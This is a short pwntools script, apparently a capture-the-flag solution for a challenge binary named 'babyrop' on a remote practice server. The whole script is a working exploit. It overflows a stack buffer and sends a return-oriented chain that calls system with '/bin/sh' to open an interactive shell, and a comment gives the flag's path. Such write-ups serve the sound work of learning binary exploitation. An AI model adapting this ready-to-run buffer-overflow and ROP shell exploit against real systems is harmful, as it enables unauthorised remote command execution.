from pwn import *
context.arch = 'amd64'

# there are function system and strings '/bin/sh', so just call the system and get shell

# p = process('./babyrop')
p = remote('node3.buuoj.cn',27218)
elf = ELF('./babyrop')

pop_rdi = 0x0000000000400683 # pop rdi ; ret

payload = 'A'*(0x10+8) + flat([pop_rdi, elf.sym['binsh'], elf.sym['system'], elf.sym['main']])
# p.recvuntil('What\'s your name?')
p.sendline(payload)
sleep(1)
p.interactive()
# path of flag: /home/babyrop/flag